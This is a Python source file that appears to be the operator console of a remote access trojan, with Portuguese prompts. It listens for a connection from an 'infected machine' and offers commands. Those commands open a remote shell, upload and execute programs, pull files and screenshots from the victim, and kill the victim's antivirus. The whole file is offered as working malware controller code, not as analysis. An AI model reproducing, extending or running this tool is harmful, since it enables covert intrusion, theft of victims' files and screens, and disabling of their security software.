#!/bin/bash/env python

import os, datetime, time, socket, subprocess, sys
from hashlib import sha1 as sha

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def help():
    print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.'.format(YELLOW, END, RED, END))
    print('{0}shell{1} - Para obter uma shell na maquina do cliente.'.format(RED, END))
    print('{0}execute{1} - Executa um programa na maquina infectada.\n Ex: execute payload.exe'.format(RED, END))
    print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.\n Ex: download foto.png'.format(RED, END))
    print('{0}screenshot{1} - tira um screenshot da tela do infectado e salva no seu desktop.'.format(RED, END))
    print('{0}killav{1} - Mata o processo de antivirus na maquina do infectado. Apenas funciona no Windows'.format(RED, END))
    print('{0}clear{1} - Limpa a tela.'.format(RED, END))
    print('{0}exit{1} - Sai do programa.'.format(RED, END))

def execute(s, program_name):
    if(len(program_name.split(' ')) == 1):
        try:
            program_name = input('Digite o nome do programa: ')
        except KeyboardInterrupt:
            return
    else:
        file = program_name.split(' ')
        file.remove('execute')
        program_name = ' '.join(file)

    s.send('6')
    s.send(program_name)
    ret = s.recv(1)
    if(ret == '1'):
        print('Arquivo não existe')
    elif(ret == '0'):
        print('Executando')

def upload(s, filepath=False):
    if(not filepath):
        command = subprocess.Popen('zenity --file-selection --title choose a file', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        ret = command.stdout.read()     
        filename = os.path.basename(ret)    
        ret = ret.replace('\n','')
        arq_path = ret.replace(" ", r"\ ").replace(" (", r" \("). replace(")", r"\)")
        if(os.path.isfile(ret)):
            s.send('1') # upload
            print('Enviando arquivo: '+ filename)
            try:
                f = open(arq_path, 'rb')
            except IOError:
                f = open(ret, 'rb')
            ler = f.read(1024)
            l = str(filename) + '+/-' + ler
            while(l):
                s.send(l)
                l = f.read(1024)
            f.close()
            print('Envio completo ...')
            s.shutdown(socket.SHUT_WR)
        else:
            print('Arquivo inválido ou não é arquivo')
            return
    else:
        pass

def download(s, desktop_path):
    desktop_path = os.path.expanduser('~')+'/Desktop/'
    path2 = os.path.expanduser('~') + r'/Área\ de\ Trabalho/'
    if(os.path.isdir(desktop_path)):
        right_path = desktop_path
    elif(os.path.isdir(path2)):
        right_path = path2

    if(len(desktop_path.split(' ')) == 1):
        try:
            filename = input('Nome do arquivo: ')
        except KeyboardInterrupt:
            return
    else:
        filename = desktop_path.split(' ')
        filename.remove('download')
        filename = ' '.join(filename)


    s.send('3')
    s.send(filename)
    exists = s.recv(1024)

    if(exists.split('+/-')[0]=='True'):
        f = open(right_path + filename, 'wb')
        j = exists.split('+/-')[1]
        l = s.recv(1024)
        l = j + l
        while(l):
            f.write(l)
            l = s.recv(1024)
        f.close()
        print('Baixado')

    else:
        print('Arquivo ' + filename +' não existe.')

def screenshot(s):
    s.send('5')
    retorno = s.recv(1024)
    if(retorno):
        nome = retorno.split('+/-')[0]
        nome = nome.replace('/tmp/', os.path.expanduser('~')+'/Desktop/')
        f = open(nome , 'wb')
        l = retorno.split('+/-')[1]
        while(l):
            f.write(l)
            l = s.recv(1024)
        f.close()
        print('Screenshot salvo na sua area de trabalho')
    else:
        raise socket.error

def killav(s):
    s.send('4')

def shell(s):
    s.send('2') # shell
    while True:
        try:
            executar = input('\33[93m~$ \033[0m')
            s.send(executar)
            if(executar == 'exit'):
                break
            retorno = s.recv(500000)
            if(not retorno):
                print('maquina desconectada, reconectando ...')
                connect('127.0.0.1', 1025)
            else:
                print(retorno)
        except KeyboardInterrupt:
            break

def parser(comand, s):
    command = comand.split(' ')[0]

    if(command == 'upload'):
        upload(s)
    elif(command == 'shell'):
        shell(s)
    elif(command == 'download'):
        download(s, comand)
    elif(command == 'screenshot'):
        screenshot(s)
    elif(command == 'execute'):
        execute(s, comand)
    elif(command=='killav'):
        killav(s)
    elif(command == 'help' or command == 'ajuda'):
        help()
    elif(command == 'clear'):
        os.system('clear')
    elif(command == 'exit'):
        sys.exit('Você escolheu sair')
    else:
        print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos'.format(END, RED, END))
        return

def connect(ip, port):
    send = False
    
    while True:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        socket_obj.bind((ip, port))
        socket_obj.listen(1) 
        
        if(not send):
            print('{0}[+] Aguardando conexões...'.format(GREEN))
        try:
    	    connection, address = socket_obj.accept()
        except KeyboardInterrupt:
            exit()
            
        retrn = connection.recv(1024)
        if(send == False):
            print(retrn)
        while True:
            try:
                try:
                    command = input('\033[0m-> ')
                except KeyboardInterrupt:
                    sys.exit()
                parser(command, connection)
            except socket.error as e: # socket.shutdown(socket.SHUT_WR)
                print(str(e))
                send = True
                break

if __name__ == '__main__':
    connect('127.0.0.1', 1025)
